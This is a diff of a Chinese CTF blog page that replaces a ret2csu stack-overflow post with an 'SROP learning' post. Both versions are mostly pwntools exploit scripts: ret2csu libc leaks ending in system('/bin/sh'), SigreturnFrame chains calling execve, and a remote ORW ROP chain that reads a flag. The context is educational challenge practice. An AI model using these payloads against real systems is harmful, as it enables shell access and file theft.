@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                ret2csu—缩短payload
+                                SROP学习
                             </h1>
                             
                                 <!--en-->
@@ -175,21 +175,17 @@
                                         lemon的自留地～
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2020-09-02</a>
+                                Date: <a href="#">2020-10-06</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">9.4
+                                    href="#">2.8
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">1753</a></span>
+                                    <span class="post-words">words:<a href="#">487</a></span>
                                     
                                         <span class="post-category">
                                 Category:
                                 
-                                <a href="https://l3mon629.github.io/tag/uryU9whCl/">ret2csu</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/us84qNRgFI/">rop</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/LszkIW-Qj5/">栈溢出</a>
+                                <a href="https://l3mon629.github.io/tag/PJmVI90Il/">srop</a>
                                 
                             </span>
                                         
@@ -201,362 +197,148 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>起因是这样的，跟一个pwn师傅聊天的时候，他发给我了一道题，说很有意思，我就打开来看了看<br>
-main函数</p>
-<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  write(1, &quot;welcome~\n&quot;, 9uLL);
-  vul();
-  return 0;
-}
-</code></pre>
-<p>vul函数</p>
-<pre><code class="language-c">ssize_t vul()
-{
-  char buf; // [rsp+0h] [rbp-80h]
-
-  return read(0, &amp;buf, 0x100uLL);
-}
-</code></pre>
-<p>就这？<br>
-我他妈直接ret2csu<br>
-先写一下原理吧，到时候复习比较方便</p>
-<h1 id="ret2csu">ret2csu</h1>
-<h2 id="__libc_csu_init">__libc_csu_init</h2>
-<p>重点关注这个函数<br>
-为啥呢，因为它里面有很好的gadget<br>
-<img src="https://l3mon629.github.io/post-images/1599021047508.png" alt="" loading="lazy"><br>
-我们知道在64位环境下，前六个参数是由寄存器来传递的，分别是rdi rsi rdx rcx r8 r9<br>
-那我们看这两个片段<br>
-第一个是pop片段</p>
-<pre><code>.text:000000000040060A                 pop     rbx
-.text:000000000040060B                 pop     rbp
-.text:000000000040060C                 pop     r12
-.text:000000000040060E                 pop     r13
-.text:0000000000400610                 pop     r14
-.text:0000000000400612                 pop     r15
-.text:0000000000400614                 retn
-</code></pre>
-<p>这一串pop和retn分别打到了寄存器上然后还能retn，但是我们需要的是那六个寄存器，但是看前一个片段</p>
-<pre><code>.text:00000000004005F0                 mov     rdx, r13
-.text:00000000004005F3                 mov     rsi, r14
-.text:00000000004005F6                 mov     edi, r15d
-.text:00000000004005F9                 call    qword ptr [r12+rbx*8]
-</code></pre>
-<p>我们可以利用这个来调整寄存器这样edi，rsi，rdx前三个寄存器便可以由我们来控制了</p>
-<h2 id="利用">利用</h2>
-<p>我们看ctfwiki<br>
-<img src="https://l3mon629.github.io/post-images/1599021305612.png" alt="" loading="lazy"><br>
-然后wiki给了一个几乎万能的exp</p>
+                            <p><img src="https://l3mon629.github.io/post-images/1601994826669.png" alt="" loading="lazy"><br>
+懒的写了，反正不太难，遇到直接抄这俩题的exp就好了</p>
+<h2 id="smallest">smallest</h2>
+<p>借用依晨师傅的堆栈变化图，我是懒狗<br>
+<img src="https://l3mon629.github.io/post-images/1601994865629.png" alt="" loading="lazy"><br>
+exp:</p>
 <pre><code class="language-python">from pwn import *
-from LibcSearcher import LibcSearcher
 
-#context.log_level = 'debug'
+local = 1
 
-level5 = ELF('./level5')
-sh = process('./level5')
+binary = &quot;./smallest&quot;
 
-write_got = level5.got['write']
-read_got = level5.got['read']
-main_addr = level5.symbols['main']
-bss_base = level5.bss()
-csu_front_addr = 0x0000000000400600
-csu_end_addr = 0x000000000040061A
-fakeebp = 'b' * 8
-
-
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    # pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    payload = 'a' * 0x80 + fakeebp
-    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
-        r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += 'a' * 0x38
-    payload += p64(last)
-    sh.send(payload)
-    sleep(1)
-
-
-sh.recvuntil('Hello, World\n')
-## RDI, RSI, RDX, RCX, R8, R9, more on the stack
-## write(1,write_got,8)
-csu(0, 1, write_got, 8, write_got, 1, main_addr)
-
-write_addr = u64(sh.recv(8))
-libc = LibcSearcher('write', write_addr)
-libc_base = write_addr - libc.dump('write')
-execve_addr = libc_base + libc.dump('execve')
-log.success('execve_addr ' + hex(execve_addr))
-##gdb.attach(sh)
-
-## read(0,bss_base,16)
-## read execve_addr and /bin/sh\x00
-sh.recvuntil('Hello, World\n')
-csu(0, 1, read_got, 16, bss_base, 0, main_addr)
-sh.send(p64(execve_addr) + '/bin/sh\x00')
-
-sh.recvuntil('Hello, World\n')
-## execve(bss_base+8)
-csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
-sh.interactive()
-</code></pre>
-<p>这个来泄漏libc是通过write函数，难度上来说比puts要更难了<br>
-思路就是先泄漏libc，然后劫持read函数，向bss段上写入/bin/sh，和system之类的系统函数，然后劫持程序流到bss段拿shell</p>
-<h1 id="解题">解题</h1>
-<p>那我们直接照抄exp就好了，反正大同小异（打脸</p>
-<pre><code class="language-python">from pwn import *
-from LibcSearcher import *
-context.log_level = 'debug'
-
-elf = ELF('./pwn2')
-p = process('./pwn2')
-#libc = ELF(&quot;./libc-2.23.so&quot;)
-
-write_got = elf.got['write']
-read_got = elf.got['read']
-main_addr = elf.symbols['main']
-print(hex(main_addr))
-bss_base = elf.bss()
-csu_front_addr = 0x4005F0
-#csu_end_addr = 0x40060A
-csu_end_addr = 0x40060A
-
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    # pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    payload = b'a' * 0x88
-    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += b'a' * 0x38
-    payload += p64(main_addr)
-    p.send(payload)
-    sleep(1)
-
-p.recvuntil('welcome~\n')
-## RDI, RSI, RDX, RCX, R8, R9, more on the stack
-## write(1,write_got,8)
-csu(0, 1, write_got, 8, write_got, 1, main_addr)
-
-write_addr = u64(p.recv(8))
-gdb.attach(p)
-
-libc = LibcSearcher('write', write_addr)
-libc_base = write_addr - libc.dump('write')
-print(hex(libc_base))
-system = libc_base + libc.dump('system')
-binsh = libc_base + libc.dump('str_bin_sh')
-
-'''
-libc = ELF('./libc-2.23.so')
-libc_base = write_addr - libc.symbols['write']
-print('libcbase ----&gt; ' + hex(libc_base))
-system = libc_base + libc.symbols['system']
-binsh = libc_base + libc.search(b'/bin/sh').__next__()
-'''
-
-
-payload = b'a' * 0x88
-payload += p64(0x40060A) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_base) + p64(0)
-payload += p64(csu_front_addr)
-payload += b'a' * 0x38
-payload += p64(main_addr)
-
-p.recvuntil('~\n')
-p.send(payload)
-
-p.send(p64(execve))
-p.send('/bin/sh\0')
-sleep(1)
-#p.send(p64(execve) + b'/bin/sh\x00')
-</code></pre>
-<p>想象是美好的，但是很快就发现了问题<br>
-程序根本无法跳转到main函数，思考了好久就是没想通<br>
-后来经过师傅提醒发现payload长度超了<br>
-只允许read 0x100个字节，那我们只好缩减payload<br>
-经过调试发现rbx寄存器本来就是0，所以我们可以省略p64(rbx)，结果发现长度正好为0x100<br>
-然后第二次向bss写数据的时候就又不行了，这个时候rbx就不是0了<br>
-所以换个思路，就用普通栈溢出的思路，找到binsh和system的地址，直接执行<br>
-由于我本地的环境有很大问题，LibcSearcher不准，每次偏移都差0x1000，我通过gdb的magic找到了system的地址，但是实在找不到binsh的地址了，所以就此作罢，但是理论上是绝对可以打通的<br>
-我贴一下最后的exp</p>
-<pre><code class="language-python">from pwn import *
-from LibcSearcher import *
-context.log_level = 'debug'
-
-elf = ELF('./pwn2')
-p = process('./pwn2')
-#libc = ELF(&quot;./libc-2.23.so&quot;)
-
-write_got = elf.got['write']
-read_got = elf.got['read']
-main_addr = elf.symbols['main']
-print(hex(main_addr))
-bss_base = elf.bss()
-csu_front_addr = 0x4005F0
-#csu_end_addr = 0x40060A
-csu_end_addr = 0x40060B
-
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    # pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    payload = b'a' * 0x88
-    payload += p64(csu_end_addr) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += b'a' * 0x38
-    payload += p64(main_addr)
-    p.send(payload)
-    sleep(1)
-
-p.recvuntil('welcome~\n')
-## RDI, RSI, RDX, RCX, R8, R9, more on the stack
-## write(1,write_got,8)
-csu(0, 1, write_got, 8, write_got, 1, main_addr)
-
-write_addr = u64(p.recv(8))
-gdb.attach(p)
-
-libc = LibcSearcher('write', write_addr)
-libc_base = write_addr - libc.dump('write')
-print(hex(libc_base))
-system = libc_base + libc.dump('system')
-binsh = libc_base + libc.dump('str_bin_sh')
-
-'''
-libc = ELF('./libc-2.23.so')
-libc_base = write_addr - libc.symbols['write']
-print('libcbase ----&gt; ' + hex(libc_base))
-system = libc_base + libc.symbols['system']
-binsh = libc_base + libc.search(b'/bin/sh').__next__()
-'''
-p.recvuntil('~\n')
-payload = b'a' * 0x88
-
-pop_ret = 0x400613
-payload += p64(pop_ret) + p64(binsh) + p64(system)
-print(&quot;binsh -----&gt; &quot; + hex(binsh))
-print(&quot;system -----&gt; &quot; + hex(system))
-p.sendline(payload)
-p.interactive()
-</code></pre>
-<p>然后贴一下我魔改了师傅的exp</p>
-<pre><code class="language-python">from pwn import  *
-from LibcSearcher import LibcSearcher
-
-def ret2libc(leak, func, path=''):
-	if path == '':
-		libc = LibcSearcher(func, leak)
-		base = leak - libc.dump(func)
-		system = base + 0x3f550 - 0x1000
-		wrong = base + libc.dump('system')
-		print(hex(wrong))
-		binsh = base + libc.dump('str_bin_sh')
-		print('str 的偏移为 ： ' + hex(libc.dump('str_bin_sh')))
-		print('system 的偏移为 ：' + hex(libc.dump('system')))
-
-	else:
-		libc = ELF(path)
-		base = leak - libc.sym[func]
-		system = base + libc.sym['system']
-		binsh = base + libc.search(b'/bin/sh').__next__()
-
-	return (system,binsh,base)
-
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-	# pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    # or csu(0,1,got_write,1,got_write,8,main) The csu functions of different programs need to be analyzed concretely
-    payload = b'a' * 0x88
-    payload += p64(gadget_pop)  + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(gadget_call)
-    payload += b'a' * 0x38
-    payload += p64(last)
-    p.send(payload)
-    return payload
-
-
-s       = lambda data               :p.send(str(data))
-sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
-sl      = lambda data               :p.sendline(str(data))
-sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
-r       = lambda num=4096           :p.recv(num)
-ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
-itr     = lambda                    :p.interactive()
-uu32    = lambda data               :u32(data.ljust(4,b'\0'))
-uu64    = lambda data               :u64(data.ljust(8,b'\0'))
-leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
-
-context.log_level = 'DEBUG'
-binary = './pwn2'
-context.binary = binary
-elf = ELF(binary,checksec=False)
-
+if local == 1:
+	p = process(binary)
 
 def dbg():
-	gdb.attach(p)
-	pause()
+	context.log_level = 'debug'
 
+context.terminal = ['tmux','splitw','-h']
+dbg()
+main = 0x4000B0			#skip xor rax,rax is 0x40000B3
+syscall_ret = 0x4000BE
 
-p = process(binary)
-#p = remote(&quot;47.95.195.235&quot;,44002)
-#libc = ELF(&quot;./libc-2.23.so&quot;)
-main = 0x400587
-gadget_pop = 0x40060B
-gadget_call =0x4005F0
-got_write = elf.got['write']
+payload = p64(main) * 3 	#the first use to return to send payload(write)
+							# the second use to change the last byte to 'b3'
+							#the third use to return
+p.send(payload)
 
-p.recvuntil('\n')
-csu(0,1,got_write,8,got_write,1,main)
+payload = '\xb3'		#rax = 1   write(1,rsp,0x400)
+p.send(payload)
+
+stack = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
+print(&quot;[*]stack:&quot;,hex(stack))
+
+context(arch = 'amd64',os = 'linux')
+
+sigframe = SigreturnFrame()
+sigframe.rax = constants.SYS_read
+sigframe.rdi = 0
+sigframe.rsi = stack
+sigframe.rdx = 0x400
+sigframe.rsp = stack
+sigframe.rip = syscall_ret
+payload = p64(main) + p64(0) + str(sigframe)
+p.send(payload)
+p.send(p64(syscall_ret) + 7*'\x00')
+
+sigframe = SigreturnFrame()
+sigframe.rax = constants.SYS_execve
+sigframe.rdi = stack + 0x200
+sigframe.rsi = 0
+sigframe.rdx = 0
+sigframe.rsp = stack
+sigframe.rip = syscall_ret
+payload = p64(main) + p64(0) + str(sigframe)
+final = payload + (0x200 - len(payload)) * '\x00' + &quot;/bin/sh\x00&quot;
+p.send(final)
+p.send(p64(syscall_ret) + 'hackedy')
+
 gdb.attach(p)
-
-#ru(&quot;welcome~\n&quot;)
-
-write_addr = uu64(r(6))
-print('write ---&gt; ' + hex(write_addr))
-system,binsh,base = ret2libc(write_addr,'write','')
-print('system ----&gt; ' + hex(system))
-print('binsh ----&gt; ' + hex(binsh))
-print(hex(base))
-
-pop_ret = 0x400613
-
-payload3 = b'a' * 136 + p64(pop_ret) + p64(binsh) + p64(system)
-sla(&quot;welcome~\n&quot;,payload3)
-itr()
+p.interactive()
 </code></pre>
-<p>orz<br>
-wtcl</p>
+<h2 id="vn2020-公开赛babybabypwn">[V&amp;N2020 公开赛]babybabypwn</h2>
+<p>加了个沙箱</p>
+<figure data-type="image" tabindex="1"><img src="https://l3mon629.github.io/post-images/1601994202160.png" alt="" loading="lazy"></figure>
+<p>这个直接给了我们系统调用，rt_sigreturn</p>
+<figure data-type="image" tabindex="2"><img src="https://l3mon629.github.io/post-images/1601994266835.png" alt="" loading="lazy"></figure>
+<p>我们直接用ORW打就行，先用sigreturn调用read，在libc的bss段布置rop链执行，然后就读flag就完事了</p>
+<p>exp:</p>
+<pre><code class="language-python">from pwn import *
+
+local = 0
+
+binary = &quot;./vn_pwn_babybabypwn_1&quot;
+
+if local == 1:
+	p = process(binary)
+else:
+	p = remote(&quot;node3.buuoj.cn&quot;,29234)
+
+def dbg():
+	context.log_level = 'debug'
+
+context.terminal = ['tmux','splitw','-h']
+
+context(arch = 'amd64',os = 'linux')
+
+libc = ELF('./libc-2.23.so')
+
+p.recvuntil('Here is my gift: ')
+puts = int(p.recv(14),16)
+libc_base = puts - libc.sym['puts']
+print &quot;[*] libc_base:&quot;,hex(libc_base)
+
+libc_bss = libc_base + 0x3C5720
+read = libc_base + libc.sym['read']
+open = libc_base + libc.sym['open']
+write = libc_base + libc.sym['write']
+
+sigframe = SigreturnFrame()
+sigframe.rdi = 0
+sigframe.rsi = libc_bss
+sigframe.rdx = 0x100
+sigframe.rip = read
+sigframe.rsp = libc_bss
+
+payload = str(sigframe)[8:]
+print payload
+print &quot;payload length:&quot;,len(payload)
+p.sendafter('Please input magic message: ',payload)
+
+pop_rdi_ret = libc_base + 0x0000000000021102
+pop_rsi_ret = libc_base + 0x00000000000202e8
+pop_rdx_ret = libc_base + 0x0000000000001b92
+
+
+print hex(pop_rdi_ret)
+print hex(pop_rsi_ret)
+print hex(pop_rdx_ret)
+
+flag = libc_bss + 152
+payload = p64(pop_rdi_ret) + p64(flag) + p64(pop_rsi_ret) + p64(0) + p64(open)
+payload += p64(pop_rdi_ret) + p64(0x3) + p64(pop_rsi_ret) + p64(libc_bss + 300) + p64(pop_rdx_ret) + p64(0x30) + p64(read)
+payload += p64(pop_rdi_ret) + p64(0x1) + p64(pop_rsi_ret) + p64(libc_bss + 300) + p64(pop_rdx_ret) + p64(0x30) + p64(write)
+payload += &quot;flag\x00&quot;
+
+print len(payload)
+p.send(payload)
+
+p.interactive()
+</code></pre>
 
                         </div>
                         
                             <div class="post-toc">
                                 <ul class="markdownIt-TOC">
-<li><a href="#ret2csu">ret2csu</a>
+<li>
 <ul>
-<li><a href="#__libc_csu_init">__libc_csu_init</a></li>
-<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
+<li><a href="#smallest">smallest</a></li>
+<li><a href="#vn2020-%E5%85%AC%E5%BC%80%E8%B5%9Bbabybabypwn">[V&amp;N2020 公开赛]babybabypwn</a></li>
 </ul>
 </li>
-<li><a href="#%E8%A7%A3%E9%A2%98">解题</a></li>
 </ul>
 
                             </div>
@@ -572,7 +354,7 @@ wtcl</p>
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/ret2csu-suo-duan-payload/">https://l3mon629.github.io/post/ret2csu-suo-duan-payload/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/srop-xue-xi/">https://l3mon629.github.io/post/srop-xue-xi/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -587,9 +369,9 @@ wtcl</p>
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/ret2csu-suo-duan-payload/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/ret2csu-suo-duan-payload/&sharesource=qzone&title=ret2csu—缩短payload&pics=https://l3mon629.github.io/images/avatar.png?v=1601994965426&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/ret2csu-suo-duan-payload/&sharesource=weibo&title=ret2csu—缩短payload + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1601994965426 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/srop-xue-xi/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/srop-xue-xi/&sharesource=qzone&title=SROP学习&pics=https://l3mon629.github.io/images/avatar.png?v=1601994965426&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/srop-xue-xi/&sharesource=weibo&title=SROP学习 + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1601994965426 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -599,16 +381,8 @@ wtcl</p>
                                                                         <span class="tag ">
                         
                         
-                        <a href="https://l3mon629.github.io/tag/uryU9whCl/">#
-                                                ret2csu
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/us84qNRgFI/">#
-                                                rop
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/LszkIW-Qj5/">#
-                                                栈溢出
+                        <a href="https://l3mon629.github.io/tag/PJmVI90Il/">#
+                                                srop
                                                     </a>
                                                     
                                                         
@@ -624,13 +398,9 @@ wtcl</p>
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/">
-                                                                                            gyctf_2020_some_thing_exceting
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/">
-                                                                                                    一道got表可写的off-by-one — hitcontraining_heapcreator
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/vn-zhao-xin-sai-de-sheng-xia-liang-dao-ti-mu/">
+                                                                                                    vn招新赛的剩下两道题目
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
